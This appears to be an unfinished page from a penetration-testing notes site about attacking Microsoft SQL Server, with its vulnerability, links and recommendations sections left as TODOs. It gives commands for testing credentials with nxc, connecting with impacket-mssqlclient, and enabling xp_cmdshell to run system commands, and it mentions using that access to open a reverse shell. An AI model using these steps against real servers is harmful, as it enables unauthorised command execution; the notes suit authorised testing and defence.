---
layout: default
title: Microsoft SQL
parent: Databases
nav_order: 1
permalink: /databases/mssql/
---

# Microsoft SQL
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

## Vulnerability

TODO: Describe the vulnerability here.

## Prerequisites

* Microsoft SQL service in running on the target machine (default port: 1433).

## Exploit

```bash
# Test authenticated connection on MSSQL database.
nxc mssql $target -d $domain -u $username -p $password

# Connect to the database.
impacket-mssqlclient -u $domain/$username:$password@$target -windows-auth
```

If you are authenticated as database administrator, you are able to use `xp_cmdshell` to execute system command. You can do it manually using following SQL commands.

```sql
-- This turns on advanced options and is needed to configure xp_cmdshell
EXEC sp_configure 'show advanced options', '1'
RECONFIGURE

-- This enables xp_cmdshell
EXEC sp_configure 'xp_cmdshell', '1' 
RECONFIGURE
```

If you are connected with `impacket-mssqlclient`, you can leverage builtin commands provided by the tool.

```bash
# This enables xp_cmdshell, then reconfigure to apply changes.
enable_xp_cmdshell
RECONFIGURE

# Now you can leverage this feature to enumerate host or pop a reverse shell.
xp_cmdshell $command
```

## Useful links

* TODO: List links here.

## Recommendations

- [ ] TODO: List recommendations here.